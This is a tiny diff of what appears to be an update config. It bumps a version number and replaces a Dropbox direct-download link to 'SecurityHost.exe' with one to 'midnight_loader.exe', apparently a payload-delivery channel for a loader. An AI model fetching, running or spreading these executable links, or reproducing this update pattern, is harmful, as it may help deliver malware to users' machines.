@@ -1,3 +1,2 @@
-v = 0.6.8
-d = https://www.dropbox.com/scl/fi/m9qhh8736p1r34t9uss80/SecurityHost.exe?rlkey=hbpfh51cc3fcc14pvk2jve4rw&st=gw6opnbs&dl=1
-
+v = 0.6.11
+d = https://www.dropbox.com/scl/fi/7biiai6dcnryg3ch7vh86/midnight_loader.exe?rlkey=ql3lqe5axp36qrurbehdehngi&st=4uc7zf57&dl=1
